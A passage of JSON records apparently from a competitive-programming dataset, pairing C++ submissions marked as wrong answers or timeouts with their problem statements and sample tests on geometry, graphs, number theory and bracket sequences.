c1.radius << ' ' << c2.radius << endl;\r\n\r\n  if(dist >= c1.radius + c2.radius){\r\n    return false;\r\n  }\r\n  if(dist <= abs(c1.radius - c2.radius)){  \r\n    return false;\r\n  }\r\n  if(dist == c1.radius + c2.radius){\r\n    return false;\r\n  }\r\n\r\n  return true;\r\n}\r\n\r\nbool valid(circle c, ring r){\r\n  return !circleIntersect(c, {r.center, r.inner}) && !circleIntersect(c, {r.center, r.outer});\r\n};\r\n\r\nint main(){\r\n  ring r1, r2;\r\n  cin >> r1.center.x >> r1.center.y >> r1.inner >> r1.outer;\r\n  cin >> r2.center.x >> r2.center.y >> r2.inner >> r2.outer;\r\n\r\n  int ans = 0;\r\n\r\n  ans += valid({r1.center, r1.inner}, r2);\r\n  ans += valid({r1.center, r1.outer}, r2);\r\n  ans += valid({r2.center, r2.inner}, r1);\r\n  ans += valid({r2.center, r2.outer}, r1);\r\n\r\n  cout << ans << endl;\r\n\treturn 0;\r\n}\r\n","description":"A renowned abstract artist Sasha, drawing inspiration from nowhere, decided to paint a picture entitled \"Special Olympics\". He justly thought that, if the regular Olympic games have five rings, then the Special ones will do with exactly two rings just fine.Let us remind you that a ring is a region located between two concentric circles with radii r and R (r\u2009&lt;\u2009R). These radii are called internal and external, respectively. Concentric circles are circles with centers located at the same point.Soon a white canvas, which can be considered as an infinite Cartesian plane, had two perfect rings, painted with solid black paint. As Sasha is very impulsive, the rings could have different radii and sizes, they intersect and overlap with each other in any way. We know only one thing for sure: the centers of the pair of rings are not the same.When Sasha got tired and fell into a deep sleep, a girl called Ilona came into the room and wanted to cut a circle for the sake of good memories. To make the circle beautiful, she decided to cut along the contour.We'll consider a contour to be a continuous closed line through which there is transition from one color to another (see notes for clarification). If the contour takes the form of a circle, then the result will be cutting out a circle, which Iona wants.But the girl's inquisitive mathematical mind does not rest: how many ways are there to cut a circle out of the canvas?","input_from":"standard input","output_to":"standard output","input_spec":"The input contains two lines.  Each line has four space-separated integers xi, yi, ri, Ri, that describe the i-th ring; xi and yi are coordinates of the ring's center, ri and Ri are the internal and external radii of the ring correspondingly (\u2009-\u2009100\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u2009100;\u00a01\u2009\u2264\u2009ri\u2009&lt;\u2009Ri\u2009\u2264\u2009100).  It is guaranteed that the centers of the rings do not coinside.","output_spec":"A single integer \u2014 the number of ways to cut out a circle from the canvas.","notes":"NoteFigures for test samples are given below. The possible cuts are marked with red dotted line.     ","sample_inputs":["60 60 45 55\n80 80 8 32","60 60 45 55\n80 60 15 25","50 50 35 45\n90 50 35 45"],"sample_outputs":["1","4","0"]}
{"difficulty":2300,"lang":"MS C++","lang_cluster":"c++","src_uid":"52b13cca189853e6af02bea8d3d85276","submission_id":"re_280","tags":["dsu","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"#pragma comment(linker, \"\/STACK:32000000\")\n#define _CRT_SECURE_NO_DEPRECATE\n\n#include \"stdio.h\"\n#include \"math.h\"\n#include \"string.h\"\n\n#include <algorithm>\n#include <set>\n#include <vector>\n#include <map>\n#include <queue>\n#include <stack>\n#include <string>\n#include <sstream>\n#include <iostream>\n\nusing namespace std;\n\n#define pi 3.1415926535897932384626433832795\n#define ALL(x) x.begin(), x.end()\n#define LL long long\n#define MP make_pair\n#define PB push_back\n#define SZ(x) ((int)x.size())\n#define SQR(x) ((x) * (x))\n#define SS stringstream\n#define CLR(a,b) memset(a, b, sizeof(a))\n#define CLR0(a) CLR(a,0)\n\n#define maxn 1500\n\nint n, m, k, q;\n\nmap<string, int> names;\nint eu[maxn], ev[maxn];\n\n\nstruct group\n{\n    set<int> people;\n    set<int> keys;\n    friend bool operator < (const group &a, const group &b)\n    {\n        if (a.people != b.people) return a.people < b.people;\n        return a.keys < b.keys;\n    }\n    friend bool operator == (const group &a, const group &b)\n    {\n        return a.people == b.people && a.keys == b.keys;\n    }\n    void reset()\n    {\n        people.clear();\n        keys.clear();\n    }\n    bool haskey(int x)\n    {\n        return keys.find(x) != keys.end();\n    }\n};\n\nint getname(char *s)\n{\n    if (names.find(string(s)) == names.end())\n    {\n        names[s] = q++;\n    }\n    return names[s];\n}\n\ngroup g[maxn];\nchar s[1000];\nint wh[maxn];\nbool f[maxn], dead[maxn];\n\nvector<group> calc()\n{\n    vector<group> res;\n    for (int i = 0; i < n; i++) g[i].reset();\n    for (int i = 0; i < k; i++)\n    {\n        int room, cnt;\n        scanf(\"%s%d%d\", s, &room, &cnt);\n        room--;\n        g[room].people.insert(getname(s));\n        for (int j = 0; j < cnt; j++)\n        {\n            int x;\n            scanf(\"%d\", &x);\n            x--;\n            g[room].keys.insert(x);\n        }\n    }\n    for (int i = 0; i < n; i++) wh[i] = i;\n\n    CLR(f, false);\n    CLR(dead, false);\n    bool ok = true;\n    while (ok)\n    {\n        ok = false;\n        for (int i = 0; i < m; i++) if (wh[eu[i]] != wh[ev[i]])\n        {\n            if (g[wh[eu[i]]].haskey(i) || g[wh[ev[i]]].haskey(i))\n            {\n                ok = true;\n                \/\/f[i] = true;\n                int g1 = wh[ev[i]];\n                int g2 = wh[eu[i]];\n                for (int j = 0; j < n; j++) if (wh[j] == g2) wh[j] = g1;\n                dead[g2] = true;\n                g[g1].keys.insert(ALL(g[g2].keys));\n                g[g1].people.insert(ALL(g[g2].people));\n            }\n        }\n    }\n    for (int i = 0; i < n; i++) if (!dead[i]) res.PB(g[i]);\n    sort(ALL(res));\n    return res;\n}\n\nvoid solve() {\n    scanf(\"%d%d%d\", &n, &m, &k);\n    for (int i = 0; i < m; i++)\n    {\n        scanf(\"%d%d\", &eu[i], &ev[i]);\n        eu[i]--;\n        ev[i]--;\n    }\n    vector<group> s1 = calc();\n    vector<group> s2 = calc();\n    printf(\"%s\", s1 == s2 ? \"YES\" : \"NO\");\n}\n\nint main()\n{\n    \/\/freopen(\"input.txt\", \"r\", stdin);\n    \/\/freopen(\"output.txt\", \"w\", stdout);\n    solve();\n    return 0;\n}","description":"Today you are to solve the problem even the famous Hercule Poirot can't cope with! That's why this crime has not yet been solved and this story was never included in Agatha Christie's detective story books. You are not informed on what crime was committed, when and where the corpse was found and other details. We only know that the crime was committed in a house that has n rooms and m doors between the pairs of rooms. The house residents are very suspicious, that's why all the doors can be locked with keys and all the keys are different. According to the provided evidence on Thursday night all the doors in the house were locked, and it is known in what rooms were the residents, and what kind of keys had any one of them. The same is known for the Friday night, when all the doors were also locked. On Friday it was raining heavily, that's why nobody left the house and nobody entered it. During the day the house residents could  open and close doors to the neighboring rooms using the keys at their disposal (every door can be opened and closed from each side);  move freely from a room to a room if a corresponding door is open;  give keys to one another, being in one room.  \"Little grey matter\" of Hercule Poirot are not capable of coping with such amount of information. Find out if the positions of people and keys on the Thursday night could result in the positions on Friday night, otherwise somebody among the witnesses is surely lying.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three preset integers n, m \u0438 k (1\u2009\u2264\u2009n,\u2009m,\u2009k\u2009\u2264\u20091000) \u2014 the number of rooms, the number of doors and the number of house residents respectively. The next m lines contain pairs of room numbers which join the doors. The rooms are numbered with integers from 1 to n. There cannot be more that one door between the pair of rooms. No door connects a room with itself. The next k lines describe the residents' position on the first night. Every line contains a resident's name (a non-empty line consisting of no more than 10 Latin letters), then after a space follows the room number, then, after a space \u2014 the number of keys the resident has. Then follow written space-separated numbers of the doors that can be unlocked by these keys. The doors are numbered with integers from 1 to m in the order in which they are described in the input data. All the residents have different names, uppercase and lowercase letters considered to be different. Every m keys occurs exactly once in the description. Multiple people may be present in one room, some rooms may be empty. The next k lines describe the position of the residents on the second night in the very same format. It is guaranteed that in the second night's description the residents' names remain the same and every m keys occurs exactly once.","output_spec":"Print \"YES\" (without quotes) if the second arrangement can result from the first one, otherwise, print \"NO\".","notes":null,"sample_inputs":["2 1 2\n1 2\nDmitry 1 1 1\nNatalia 2 0\nNatalia 1 1 1\nDmitry 2 0","4 4 3\n1 3\n1 2\n2 3\n3 4\nArtem 1 1 4\nDmitry 1 1 2\nEdvard 4 2 1 3\nArtem 2 0\nDmitry 1 0\nEdvard 4 4 1 2 3 4"],"sample_outputs":["YES","NO"]}
{"difficulty":2400,"lang":"GNU C++14","lang_cluster":"c++","src_uid":"566adc43d2d6df257c26c5f5495a5745","submission_id":"re_398","tags":["number theory"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"\/\/By Tushar Gautam\n#pragma GCC optimize (\"-O2\")\n#include <bits\/stdc++.h>\nusing namespace std;\n#define fastio ios_base::sync_with_stdio(false);cin.tie(0);cout.tie(0)\n#define pb push_back\n#define mp make_pair\n#define fi first\n#define se second\n#define memreset(a) memset(a,0,sizeof(a))\n#define testcase(t) int t;cin>>t;while(t--)\n#define forstl(i,v) for(auto &i: v)\n#define forn(i,e) for(int i = 0; i < e; i++)\n#define forsn(i,s,e) for(int i = s; i < e; i++)\n#define rforn(i,s) for(int i = s; i >= 0; i--)\n#define rforsn(i,s,e) for(int i = s; i >= e; i--)\n#define leadzero(a) __builtin_clz(a) \/\/ count leading zeroes\n#define trailzero(a) __builtin_ctz(a) \/\/ count trailing zeroes\n#define bitcount(a) __builtin_popcount(a) \/\/ count set bits (add ll)\n#define ln \"\\n\"\n#define dbg2(x,y) cerr<<#x<<\" = \"<<x<<\" & \"<<#y<<\" = \"<<y<<endl;\n#define dbgstl32(v) cerr<<#v<<\" = \\n\"; { int c=0; forstl(it,v) \\\ncerr<<\"    Term \"<< ++c <<\" = \"<<it<<ln;} cerr<<endl\n#define dbgstlp32(v) cerr<<#v<<\" = \\n\"; { int c=0; forstl(it,v) \\\ncerr<<\"    Term \"<< ++c <<\" = \"<<it.fi<<\" , \"<<it.se<<ln;} cerr<<endl\n#define dbgarr(v,s,e) cerr<<#v<<\" = \"; forsn(i,s,e) cerr<<v[i]<<\", \"; cerr<<endl\n#define inp freopen(\"input.txt\", \"r\", stdin)\n#define outp freopen(\"output.txt\", \"w\", stdout)\n#define dbg(args...) { string _s = #args; replace(_s.begin(), _s.end(), ',', ' '); \\\nstringstream _ss(_s); istream_iterator<string> _it(_ss); err(_it, args); }\nvoid err(istream_iterator<string> it) {}\ntemplate<typename T, typename... Args>\nvoid err(istream_iterator<string> it, T a, Args... args) {\n\tcerr << *it << \" = \" << a << endl;\n\terr(++it, args...);\n}\ntypedef long long int  ll;\ntypedef long double  ld;\ntypedef pair<ll,ll> p64;\ntypedef pair<int,int> p32;\ntypedef vector<ll> v64;\ntypedef vector<int> v32; \ntypedef vector<v32> vv32;\ntypedef vector<v64> vv64;\ntypedef vector<p32> vp32;\ntypedef vector<vp32> vvp32;\ntypedef map<int,int> m32;\nconst int LIM = 1e5+5, MOD = 1e9+7;\nint c;\nstring b,n;\nint s2i(string p,int m){\n\tint i=0;\n\tll ans=0,pw10=1;\n\twhile(p[i]){\n\t\tans+=(p[i]-'0')*pw10;\n\t\tans%=m;\n\t\tpw10=pw10*10%m;\n\t\t++i;\n\t}\n\treturn ans;\n}\nint is_com[LIM];\nv32 pr;\nvoid sieve(){\n    is_com[1]=1;\n    forsn(i,2,LIM){\n        if(!is_com[i]){\n            pr.pb(i);\n            for(int j=i;j<LIM;j+=i){\n                is_com[j]=i;\n            }\n        }\n    }\n}\nint phi(int n){\n\tmap<int,int> M;\n\tforstl(it,pr){\n\t\twhile(n%it==0) M[it]++,n\/=it;\n\t}\n\tif(n!=1) M[n]++;\n\tint ph=1;\n\tforstl(it,M){\n\t\tph*=it.fi-1;\n\t\tforn(i,it.se-1){\n\t\t\tph*=it.fi;\n\t\t}\n\t}\n\treturn ph;\n}\nll powm(ll x,ll pw,ll MOD){ \/\/return x^pw % MOD\n\tll res=1;\n\twhile(pw){\n\t\tif(pw&1LL) res=((res*x))%MOD;\n\t\tpw>>=1;\n\t\tx=((x*x))%MOD;\n\t}\n\treturn res;\n}\nint main(){\n\tfastio;\n\tsieve();\n\tcin>>b>>n>>c;\n\tint ph=phi(c);\n\treverse(b.begin(),b.end());\n\treverse(n.begin(),n.end());\n\t\/\/ n-1\n\tint i=0;\n\twhile(n[i]){\n\t\tif(n[i]=='0') n[i]='9';\n\t\telse{\n\t\t\tn[i]--; break;\n\t\t}\n\t\t++i;\n\t}\n\tint bs=s2i(b,c);\n\tint pw=s2i(n,2*ph);\n\tll ans=powm(bs,pw%ph,c);\n\tbool yes=1;\n\tif(n.length()<31){\n\t\tint x =stoi(n);\n\t\tif(x<ph) yes=0;\n\t}\n\tif(yes){\n\t\tans*=powm(bs,ph,c);\n\t\tans%=c;\n\t}\n\tans*=(bs+c-1)%c;\n\tans%=c;\n\tif(ans==0) ans+=c;\n\tcout<<ans<<ln;\n\treturn 0;\n}","description":"Nick is attracted by everything unconventional. He doesn't like decimal number system any more, and he decided to study other number systems. A number system with base b caught his attention. Before he starts studying it, he wants to write in his notepad all the numbers of length n without leading zeros in this number system. Each page in Nick's notepad has enough space for c numbers exactly. Nick writes every suitable number only once, starting with the first clean page and leaving no clean spaces. Nick never writes number 0 as he has unpleasant memories about zero divide.Would you help Nick find out how many numbers will be written on the last page.","input_from":"standard input","output_to":"standard output","input_spec":"The only input line contains three space-separated integers b, n and c (2\u2009\u2264\u2009b\u2009&lt;\u200910106, 1\u2009\u2264\u2009n\u2009&lt;\u200910106, 1\u2009\u2264\u2009c\u2009\u2264\u2009109). You may consider that Nick has infinite patience, endless amount of paper and representations of digits as characters. The numbers doesn't contain leading zeros.","output_spec":"In the only line output the amount of numbers written on the same page as the last number.","notes":"NoteIn both samples there are exactly 4 numbers of length 3 in binary number system. In the first sample Nick writes 3 numbers on the first page and 1 on the second page. In the second sample all the 4 numbers can be written on the first page.","sample_inputs":["2 3 3","2 3 4"],"sample_outputs":["1","4"]}
{"difficulty":1600,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"5c4bd12df3915186a7b506c2060db125","submission_id":"214549596","tags":["dp","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\n#define ll long long\n#define endl \"\\n\"\nconst int MOD=1e9+7;\nusing namespace std;\nll dp[1000005];\nll ed1=0;\nll ed=0;\nint main()\n{\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    ll n;\n    cin>>n;\n    dp[0]=0;\n    for(ll i=1;i<=n;i++)\n    {\n        if(i%2==0)\n        {\n            dp[i]=dp[i-1]+ed1+1;\n            ed=dp[i]-ed1;\n        }else\n        {\n            dp[i]=dp[i-1]+ed+1;\n            ed1=dp[i]-ed;\n        }\n    }\n\/\/    for(ll i=1;i<=n;i++)\n\/\/    {\n\/\/        cout<<dp[i]<<\" \";\n\/\/    }\ncout<<dp[n];\n}\n\n \t \t   \t \t\t\t  \t\t\t      \t  \t\t\t\t\t","description":"Polycarpus plays with red and blue marbles. He put n marbles from the left to the right in a row. As it turned out, the marbles form a zebroid.A non-empty sequence of red and blue marbles is a zebroid, if the colors of the marbles in this sequence alternate. For example, sequences (red; blue; red) and (blue) are zebroids and sequence (red; red) is not a zebroid.Now Polycarpus wonders, how many ways there are to pick a zebroid subsequence from this sequence. Help him solve the problem, find the number of ways modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009106) \u2014 the number of marbles in Polycarpus's sequence.","output_spec":"Print a single number \u2014 the answer to the problem modulo 1000000007 (109\u2009+\u20097).","notes":"NoteLet's consider the first test sample. Let's assume that Polycarpus initially had sequence (red; blue; red), so there are six ways to pick a zebroid:   pick the first marble;  pick the second marble;  pick the third marble;  pick the first and second marbles;  pick the second and third marbles;  pick the first, second and third marbles. It can be proven that if Polycarpus picks (blue; red; blue) as the initial sequence, the number of ways won't change.","sample_inputs":["3","4"],"sample_outputs":["6","11"]}
{"difficulty":1700,"lang":"GNU C++14","lang_cluster":"c++","src_uid":"5ce8de80c6953cd1e6e6eefd9ad35f7e","submission_id":"re_12","tags":["data structures","implementation","expression parsing"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\n#define int long long\nusing namespace std;\n\n\nsigned main() {\n    ios::sync_with_stdio(false);\n    cin.tie(nullptr);\n    #ifndef ONLINE_JUDGE\n    freopen(\"input.txt\", \"r\", stdin);\n    freopen(\"output.txt\", \"w\", stdout);\n    #endif\n    string str;\n    cin >> str;\n    int sz = str.size();\n    int a[sz+1], cnt[sz+1];\n    cnt[0]=0;\n    for(int i=0;i<sz;i++){\n        cnt[i+1]=cnt[i];\n    \tif(str[i]=='(')\n    \t\ta[i+1]=1;\n    \telse if(str[i]==')')\n    \t\ta[i+1]=2;\n    \telse if(str[i]=='[')\n    \t\ta[i+1]=3;\n    \telse\n    \t\ta[i+1]=4,cnt[i+1]++;\n\n    }\n    stack<pair<int, int> > s;\n    int last=sz;\n    int op[sz+1];\n    memset(op, -1,sizeof(op));\n    for(int i = 1; i <= sz; i++) {\n    \tif(a[i]==1 || a[i]==3){\n    \t\ts.push({a[i],i});\n    \t}\n    \telse if(a[i]-s.top().first==1) {\n            op[i]=s.top().second;\n    \t\ts.pop();\n            last=i;\n    \t}\n        else{\n            break;\n        }\n    }\n    int mx=0, start=-1, end=-1;\n    for(int i=1; i<=last; i++){\n        if(op[i]==-1)\n            continue;\n        if(op[op[i]-1]!=-1)\n            op[i]=op[op[i]-1];\n        if(cnt[i]-cnt[op[i]-1] >= mx){\n            start=op[i];\n            end=i;\n            mx=cnt[i]-cnt[op[i]-1];\n        }\n    }\n    cout<<mx<<\"\\n\";\n    if(start!=-1){\n        for(int i=start; i<=end;i++)\n            cout<<str[i-1];\n    }\n}","description":"A bracket sequence is a string, containing only characters \"(\", \")\", \"[\" and \"]\".A correct bracket sequence is a bracket sequence that can be transformed into a correct arithmetic expression by inserting characters \"1\" and \"+\" between the original characters of the sequence. For example, bracket sequences \"()[]\", \"([])\" are correct (the resulting expressions are: \"(1)+[1]\", \"([1+1]+1)\"), and \"](\" and \"[\" are not. The empty string is a correct bracket sequence by definition.A substring s[l... r] (1\u2009\u2264\u2009l\u2009\u2264\u2009r\u2009\u2264\u2009|s|) of string s\u2009=\u2009s1s2... s|s| (where |s| is the length of string s) is the string slsl\u2009+\u20091... sr. The empty string is a substring of any string by definition.You are given a bracket sequence, not necessarily correct. Find its substring which is a correct bracket sequence and contains as many opening square brackets \u00ab[\u00bb as possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first and the only line contains the bracket sequence as a string, consisting only of characters \"(\", \")\", \"[\" and \"]\". It is guaranteed that the string is non-empty and its length doesn't exceed 105 characters.","output_spec":"In the first line print a single integer \u2014 the number of brackets \u00ab[\u00bb in the required bracket sequence. In the second line print the optimal sequence. If there are more than one optimal solutions print any of them.","notes":null,"sample_inputs":["([])","((("],"sample_outputs":["1\n([])","0"]}
{"difficulty":2700,"lang":"GNU C++","lang_cluster":"c++","src_uid":"6220f4058f9325dfb211fb1dd86e9464","submission_id":"re_874","tags":["data structures","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"#define _CRT_SECURE_NO_WARNINGS\n#include <cstdio>\n#include <cstring>\n#include <cassert>\n#include <cstdlib>\n#include <ctime>\n#include <cmath>\n\n#include <algorithm>\n#include <iostream>\n#include <sstream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <map>\n#include <set>\n\n#define sz(c) ((int)(c).size())\n#define pb push_back\n#define mp make_pair\n\n#define REP(i, n) for (int (i) = 0; (i) < (n); ++(i))\n#define FOR(i, s, n) for (int (i) = (s); (i) < (n); ++(i))\n\nusing namespace std;\ntypedef double dbl;\n\nconst dbl pi  = 3.1415926535897932384626433832795;\n\nstruct Pnt\n{\n  Pnt() : x(0), y(0) {}\n  Pnt( dbl x, dbl y ) : x(x), y(y) {}\n\n  Pnt operator + ( Pnt const& p ) const { return Pnt(x + p.x, y + p.y); }\n  Pnt operator - ( Pnt const& p ) const { return Pnt(x - p.x, y - p.y); }\n  Pnt operator * ( dbl a ) const { return Pnt(x * a, y * a); }\n\n  dbl operator * ( Pnt p ) const { return x * p.x + y * p.y; }\n  dbl operator ^ ( Pnt p ) const { return x * p.y - y * p.x; }\n\n  dbl angle() const { return atan2(y, x); }\n\n  bool operator == ( Pnt p ) const\n  {\n    return mp(x, y) == mp(p.x, p.y);\n  }\n\n  void read() { scanf(\"%lf%lf\", &x, &y); }\n\n  dbl x, y;\n};\n\nstruct Sect\n{\n  Sect( Pnt a, Pnt b )\n    : a(a)\n    , b(b)\n  {\n    assert((a ^ b) >= 0);\n    l = a.angle();\n  }\n\n  bool operator < ( Sect const& s ) const { return l + 1e-13 < s.l; }\n\n  Pnt to() const { return b - a; }\n\n  dbl l;\n  Pnt a, b;\n};\n\ninline set<Sect>::iterator next( set<Sect>::iterator si, set<Sect>& sects )\n{\n  return (++si == sects.end()) ? sects.begin() : si;\n}\n\ninline set<Sect>::iterator prev( set<Sect>::iterator si, set<Sect>& sects )\n{\n  if (si == sects.begin())\n    si = sects.end();\n  return --si;\n}\n\nset<Sect>::iterator getSect( Pnt p, set<Sect>& sects )\n{\n  set<Sect>::iterator i = upper_bound(sects.begin(), sects.end(), Sect(p, p));\n  if (i == sects.begin())\n    i = sects.end();\n  --i;\n  assert((i->a ^ p) >= 0);\n  assert((p ^ i->b) >= 0);\n  return i;\n}\n\nint main()\n{\n\/\/  freopen(\"input.txt\", \"rt\", stdin);\n\/\/  freopen(\"output.txt\", \"wt\", stdout);\n\n  long st = clock();\n\n  int q;\n  scanf(\"%d\", &q);\n  \n  q -= 3;\n  assert(q > 0);\n\n  Pnt origin;\n  set<Sect> sects;\n  {\n    Pnt p[3];\n    REP(i, 3)\n    {\n      scanf(\"%*d\");\n      p[i].read();\n      origin = origin + p[i];\n    }\n    REP(i, 3)\n      p[i] = p[i] * 3.0 - origin;\n\n\/\/    cerr << origin.x << \" \" << origin.y << \"\\n\";\n\/\/    REP(i, 3)\n\/\/      cerr << p[i].x << \" \" << p[i].y << \"\\n\";\n\n    if ((p[0] ^ p[1]) < 0)\n      swap(p[0], p[1]);\n    assert((p[0] ^ p[1]) >= 0);\n    assert((p[1] ^ p[2]) >= 0);\n    assert((p[2] ^ p[0]) >= 0);\n    REP(i, 3)\n      sects.insert(Sect(p[i], p[(i + 1) % 3]));\n  }\n\n  REP(reqIt, q)\n  {\n    if (reqIt % 200 == 0 && clock() - st >= 1.8 * CLOCKS_PER_SEC)\n    {\n      printf(\"%d outputted\\n\", reqIt);\n      return 0;\n    }\n\n    int req;\n    scanf(\"%d\", &req);\n\n    Pnt p;\n    p.read();\n    p = p * 3.0 - origin;\n\/\/    cerr << \"#\" << reqIt << \": \" << p.x << \" \" << p.y << \"\\n\";\n\n    if (p == Pnt(0, 0))\n    {\n      if (req == 2)\n        printf(\"YES\\n\");\n      continue;\n    }\n\n    set<Sect>::iterator si = getSect(p, sects);\n    if (req == 1)\n    {\n      if (((p - si->a) ^ si->to()) <= 0)\n        continue;\n\n      set<Sect>::iterator left  = si;\n      set<Sect>::iterator prevl = prev(si, sects);\n      set<Sect>::iterator right = si;\n      set<Sect>::iterator nextr = next(si, sects);\n      while (((left->a - p) ^ (prevl->a - p)) >= 0)\n      {\n        left = prevl;\n        prevl = prev(prevl, sects);\n      }\n      while (((right->b - p) ^ (nextr->b - p)) <= 0)\n      {\n        right = nextr;\n        nextr = next(nextr, sects);\n      }\n      Sect s1(left->a, p);\n      Sect s2(p, right->b);\n\n      bool run = true;\n      for (set<Sect>::iterator i = left; run; )\n      {\n        if (i == right)\n          run = false;\n        set<Sect>::iterator toDelete = i;\n        i = next(i, sects);\n        sects.erase(toDelete);\n        if (!run)\n          break;\n      }\n      sects.insert(s1);\n      sects.insert(s2);\n    }\n    else\n    {\n      printf(\"%s\\n\", (((p - si->a) ^ si->to()) > 0) ? \"NO\" : \"YES\");\n    }\n  }\n  \n\n  return 0;\n}\n","description":"Once a walrus professor Plato asked his programming students to perform the following practical task. The students had to implement such a data structure that would support a convex hull on some set of points S. The input to the program had q queries of two types: 1. Add a point with coordinates (x,\u2009y) into the set S. Note that in this case the convex hull of S could have changed, and could have remained the same. 2. Say whether a point with coordinates (x,\u2009y) belongs to an area limited by the convex hull, including the border. All the students coped with the task. What about you?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer q (4\u2009\u2264\u2009q\u2009\u2264\u2009105).  Then follow q lines in the following way: \"t x y\", where t is the query type (1 or 2), and (x,\u2009y) are the coordinates of the point (\u2009-\u2009106\u2009\u2264\u2009x,\u2009y\u2009\u2264\u2009106, x and y are integers).  There is at least one query of type 2. It is guaranteed that the three queries of the first type follow first and the points given in the queries form a non-degenerative triangle. Also all the points added in S are distinct.","output_spec":"For each query of the second type print one string containing \"YES\", if the point lies inside the convex hull or on its border. Otherwise, print \"NO\".","notes":null,"sample_inputs":["8\n1 0 0\n1 2 0\n1 2 2\n2 1 0\n1 0 2\n2 1 1\n2 2 1\n2 20 -1"],"sample_outputs":["YES\nYES\nYES\nNO"]}
{"difficulty":2100,"lang":"GNU C++","lang_cluster":"c++","src_uid":"6e2a8aa58ed8cd308cb482e4c24cbbbb","submission_id":"re_629","tags":["binary search","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <cmath>\n\nusing namespace std;\n\ndouble cartesian_distance(const vector<double>& a, \n      const vector<double>& b) {\n   double square_sum = 0;\n\n   for(int i = 0; i < 3; ++i) {\n      square_sum += (b[i] - a[i]) * (b[i] - a[i]);\n   }\n\n   return sqrt(square_sum);\n}\n\ninline void read_point(vector<double>& dest) {\n   for(int j = 0; j < 3; ++j) {\n      int a;\n      cin >> a;\n      dest[j] = a;\n   }\n}\n\nint main() {\n   ios_base::sync_with_stdio(false);\n\n   cout.setf(ios_base::fixed, ios_base::floatfield);\n   cout.precision(10);\n\n   int n;\n   cin >> n;\n\n   vector<vector<double> > lines(n + 1, vector<double>(3));\n\n   for(int i = 0; i <= n; ++i) {\n      read_point(lines[i]);\n   }\n\n   int v_potter, v_snitch;\n   cin >> v_potter >> v_snitch;\n\n   vector<double> potter_start(3);\n   read_point(potter_start);\n\n   \/\/ General idea: Do a binary search on the time Harry will catch\n   \/\/ the snitch. \n   \/\/ Let t_left and t_right be the range of times where\n   \/\/ you are searching in, and t_middle = (t_left + t_right) \/ 2.\n   \/\/ If Harry can reach the ball at t_middle (i.e, if the time it takes\n   \/\/ Harry to reach the point where the snitch is at t_middle is <= \n   \/\/ t_middle), then we'll search in [t_left, t_middle], otherwise\n   \/\/ we'll search in [t_middle, t_right]. Notice that, because \n   \/\/ v_potter >= v_snitch, if Harry can catch the snitch at time\n   \/\/ t_a, then he will be able to catch it at time t_b > t_a. So the\n   \/\/ algorithm will always find the correct answer if it exists.\n   \/\/ Also, if Harry can't reach the last point fast enough (i.e before\n   \/\/ the snitch), then there is no answer.\n   \/\/\n   \/\/ We'll need to compute the time it takes reach each particular \n   \/\/ line so we know the point where the snitch is at a particular time t\n\n   vector<double> times(n + 1);\n\n   for(int i = 1; i <= n; ++i) {\n      times[i] = times[i - 1] + \n         cartesian_distance(lines[i], lines[i - 1]) \/ v_snitch;\n   }\n\n   if (times[n] < cartesian_distance(potter_start, lines[n]) \/\n         v_potter) {\n      cout << \"NO\\n\";\n   } else {\n      \/\/ Possible, start binary search\n      double t_left = 0, \n             t_right = times[n],\n             t_middle;\n\n      const double eps = 1e-12;\n      vector<double> point(3);\n\n      while(true) {\n        t_middle = (t_left + t_right) \/ 2;\n\n        \/\/ Find the line where t_middle belongs\n        \/\/ index is the second point of the line\n        int index = upper_bound(times.begin(), times.end(), t_middle) -\n           times.begin();\n\n        double segment_time = t_middle - times[index - 1];\n        double factor = segment_time \/ (times[index] - times[index - 1]);\n\n        \/\/ Compute point\n        for(int i = 0; i < 3; ++i) {\n           point[i] = lines[index - 1][i] + \n              factor * (lines[index][i] - lines[index - 1][i]);\n        }\n\n        double potter_distance = cartesian_distance(point, potter_start);\n        double potter_time = potter_distance \/ v_potter;\n\n        if (abs(potter_time - t_middle) <= eps) {\n           break;\n        } else if (potter_time > t_middle) {\n           \/\/ Search right\n           t_left = t_middle;\n        } else {\n           t_right = t_middle;\n        }\n      }\n\n      cout << \"YES\\n\";\n      cout << t_middle << '\\n';\n      cout << point[0] << ' ' << point[1] << ' ' << point[2] << '\\n';\n   }\n}\n","description":"Brothers Fred and George Weasley once got into the sporting goods store and opened a box of Quidditch balls. After long and painful experiments they found out that the Golden Snitch is not enchanted at all. It is simply a programmed device. It always moves along the same trajectory, which is a polyline with vertices at the points (x0,\u2009y0,\u2009z0), (x1,\u2009y1,\u2009z1), ..., (xn,\u2009yn,\u2009zn). At the beginning of the game the snitch is positioned at the point (x0,\u2009y0,\u2009z0), and then moves along the polyline at the constant speed vs. The twins have not yet found out how the snitch behaves then. Nevertheless, they hope that the retrieved information will help Harry Potter and his team in the upcoming match against Slytherin. Harry Potter learned that at the beginning the game he will be at the point (Px,\u2009Py,\u2009Pz) and his super fast Nimbus 2011 broom allows him to move at the constant speed vp in any direction or remain idle. vp is not less than the speed of the snitch vs. Harry Potter, of course, wants to catch the snitch as soon as possible. Or, if catching the snitch while it is moving along the polyline is impossible, he wants to hurry the Weasley brothers with their experiments. Harry Potter catches the snitch at the time when they are at the same point. Help Harry.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200910000). The following n\u2009+\u20091 lines contain the coordinates xi, yi, zi, separated by single spaces. The coordinates of any two consecutive points do not coincide. The next line contains the velocities vp and vs, the last line contains Px, Py, Pz, separated by single spaces. All the numbers in the input are integers, their absolute value does not exceed 104. The speeds are strictly positive. It is guaranteed that vs\u2009\u2264\u2009vp.","output_spec":"If Harry Potter can catch 